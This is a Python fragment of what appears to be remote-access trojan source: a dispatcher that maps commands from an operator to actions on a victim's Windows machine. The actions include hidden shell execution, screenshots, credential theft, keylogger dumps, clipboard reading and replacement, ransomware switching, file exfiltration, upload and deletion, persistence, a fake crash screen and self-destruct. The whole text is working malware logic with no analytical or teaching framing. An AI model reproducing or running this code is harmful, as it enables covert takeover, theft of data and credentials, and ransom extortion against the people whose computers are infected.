def f_dispatch(hdr, blob):
    t = hdr.get("t")
    a = hdr.get("arg", "") or ""
    try:
        if t == "ping":
            f_queue({"t": "pong", "arg": a})
        elif t == "shot":
            f_queue({"t": "shot", "ts": int(time.time())}, f_grab())
        elif t == "shell":
            try:
                r = subprocess.run(["cmd", "/c", a], capture_output=True,
                                   timeout=180, creationflags=0x08000000)
                out = (r.stdout + r.stderr).decode("utf-8", "replace")[:60000]
            except Exception as e:
                out = str(e)
            f_queue({"t": "shell", "arg": a}, out.encode("utf-8", "replace"))
        elif t == "ps":
            f_queue({"t": "ps", "arg": a}, f_ps(a).encode("utf-8", "replace"))
        elif t == "steal":
            f_steal()
        elif t == "keys":
            f_queue({"t": "keys", "win": ""}, f_keybuf().encode("utf-8", "replace"))
        elif t == "clip":
            f_queue({"t": "clip"}, f_clip_get().encode("utf-8", "replace"))
        elif t == "setclip":
            f_setclip(a)
            f_queue({"t": "ack", "arg": "clipboard set"})
        elif t == "procs":
            f_queue({"t": "procs"}, f_procs().encode("utf-8", "replace"))
        elif t == "info":
            f_queue({"t": "info"}, f_info_text().encode("utf-8", "replace"))
        elif t == "ransom":
            f_ransom_on()
        elif t == "unransom":
            f_ransom_off()
        elif t == "wall":
            f_set_wall(a)
        elif t == "ls":
            f_queue({"t": "ls", "arg": a}, f_ls(a).encode("utf-8", "replace"))
        elif t == "cat":
            if os.path.isfile(a):
                f_queue({"t": "dl", "arg": a, "name": os.path.basename(a)}, open(a, "rb").read())
            else:
                f_queue({"t": "ack", "arg": "missing: " + a})
        elif t == "dl":
            if os.path.isfile(a):
                f_queue({"t": "dl", "arg": a, "name": os.path.basename(a)}, open(a, "rb").read())
            else:
                f_queue({"t": "ack", "arg": "missing: " + a})
        elif t == "ul":
            os.makedirs(os.path.dirname(a) or ".", exist_ok=True)
            open(a, "wb").write(blob)
            f_queue({"t": "ack", "arg": "uploaded: " + a})
        elif t == "rm":
            try:
                if os.path.isdir(a):
                    shutil.rmtree(a, ignore_errors=True)
                else:
                    os.remove(a)
                f_queue({"t": "ack", "arg": "removed: " + a})
            except Exception as e:
                f_queue({"t": "ack", "arg": "rm fail: " + str(e)})
        elif t == "mkdir":
            try:
                os.makedirs(a, exist_ok=True)
                f_queue({"t": "ack", "arg": "created: " + a})
            except Exception as e:
                f_queue({"t": "ack", "arg": "mkdir fail: " + str(e)})
        elif t == "cp":
            s, _, d = a.partition("|")
            shutil.copy2(s.strip(), d.strip())
            f_queue({"t": "ack", "arg": "copied"})
        elif t == "mv":
            s, _, d = a.partition("|")
            shutil.move(s.strip(), d.strip())
            f_queue({"t": "ack", "arg": "moved"})
        elif t == "find":
            f_queue({"t": "find", "arg": a}, f_find(a).encode("utf-8", "replace"))
        elif t == "hash":
            f_queue({"t": "hash", "arg": a}, f_hash(a).encode("utf-8", "replace"))
        elif t == "zip":
            data, nm = f_zipdir(a)
            f_queue({"t": "dl", "arg": a, "name": nm}, data)
        elif t == "monitor":
            f_monitor()
        elif t == "lock":
            f_lock()
        elif t == "beep":
            f_beep()
        elif t == "volume":
            f_volume(a)
        elif t == "volmax":
            f_queue({"t": "ack", "arg": f_volmax()})
        elif t == "bsod":
            f_queue({"t": "ack", "arg": f_bsod(a)})
        elif t == "yt":
            f_queue({"t": "ack", "arg": f_yt(a)})
        elif t == "ytstop":
            f_queue({"t": "ack", "arg": f_ytstop()})
        elif t == "kbd":
            f_queue({"t": "ack", "arg": f_kbd_on()})
        elif t == "kbdkey":
            f_kbdkey(a)
        elif t == "kbdstop":
            f_queue({"t": "ack", "arg": f_kbd_off()})
        elif t == "wifi":
            f_queue({"t": "wifi"}, f_wifi().encode("utf-8", "replace"))
        elif t == "speak":
            f_speak(a)
        elif t == "open":
            f_open(a)
        elif t == "services":
            f_queue({"t": "services"}, f_services().encode("utf-8", "replace"))
        elif t == "netstat":
            f_queue({"t": "netstat"}, f_netstat().encode("utf-8", "replace"))
        elif t == "env":
            f_queue({"t": "env"}, f_env().encode("utf-8", "replace"))
        elif t == "installed":
            f_queue({"t": "installed"}, f_installed().encode("utf-8", "replace"))
        elif t == "idle":
            f_queue({"t": "ack", "arg": "idle " + f_idle()})
        elif t == "killpid":
            f_queue({"t": "ack", "arg": f_killpid(a)})
        elif t == "killname":
            f_queue({"t": "ack", "arg": f_killname(a)})
        elif t == "shutdown":
            f_queue({"t": "ack", "arg": f_shutdown(a)})
        elif t == "msg":
            threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(
                None, a, "Notice", 0x40), daemon=True).start()
        elif t == "persist":
            f_persist()
        elif t == "unpersist":
            f_unpersist()
        elif t == "selfdestruct":
            f_selfdestruct()
        elif t == "exit":
            f_queue({"t": "bye"})
            time.sleep(1)
            os._exit(0)
        elif t == "kill":
            os._exit(0)
    except Exception as e:
        f_queue({"t": "err", "e": str(e)})